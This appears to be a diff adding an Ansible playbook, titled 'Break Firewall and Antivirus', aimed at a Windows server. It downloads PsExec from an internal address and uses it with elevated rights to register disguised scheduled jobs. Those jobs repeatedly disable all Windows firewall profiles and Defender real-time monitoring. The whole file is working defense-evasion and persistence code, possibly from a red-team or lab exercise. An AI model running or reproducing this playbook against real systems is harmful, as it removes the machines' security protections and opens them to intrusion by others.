@@ -1,0 +1,24 @@
+-
+  name: Break Firewall and Antivirus
+  hosts: windows-server
+  tasks:
+    - name: Creates directory
+      win_file:
+          path: C:\temp\
+          state: directory
+
+    - name: Get Executable from the host
+      win_get_url:
+        url: http://192.168.13.129/temp/PsExec.exe
+        dest: C:\temp\PsExec.exe
+    -
+      name:  Powershell scripties
+      win_psexec:
+        command: '{{ item }}'
+        executable: C:\temp\PsExec.exe
+        elevated: yes
+        nobanner: yes
+        interactive: yes
+      with_items:
+        - powershell.exe Register-ScheduledJob -Name '3Yaik22es' -ScriptBlock { Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False } -RunNow -RunEvery 00:05:00
+        - powershell.exe Register-ScheduledJob -Name '3Ya2ikees' -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true } -RunNow -RunEvery 00:02:00
